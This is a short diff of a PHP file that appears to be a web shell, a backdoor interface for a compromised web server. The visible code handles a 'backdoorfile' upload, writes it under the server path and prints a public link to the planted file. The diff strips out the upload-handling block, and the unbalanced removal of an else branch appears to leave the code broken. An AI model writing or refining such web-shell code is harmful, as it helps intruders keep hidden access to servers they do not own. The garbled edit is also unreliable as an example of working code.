@@ -720,9 +720,7 @@ if (isset($_GET['viewfile'])) {
                     $fl = $serlok."/".$_FILES['backdoorfile']['name'];
                     echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>
                     Uploaded => <font color='lime'><i>".$_FILES['backdoorfile']['name']."</i></font><br>";
-                    if (is_uploaded_file($tmp) && filesize($tmp) > 0) {
-    move_uploaded_file($tmp, $target);
-  } else {
+                    
                     if (strpos($serlok, $_SERVER['DOCUMENT_ROOT']) !== false) {
                         $lwb = str_replace($_SERVER['DOCUMENT_ROOT'], $web."/", $fl);
                         echo "Link : <a href='".$lwb."' target='_blank'><font color='lime'>Click here</font></a></td></table><br>";
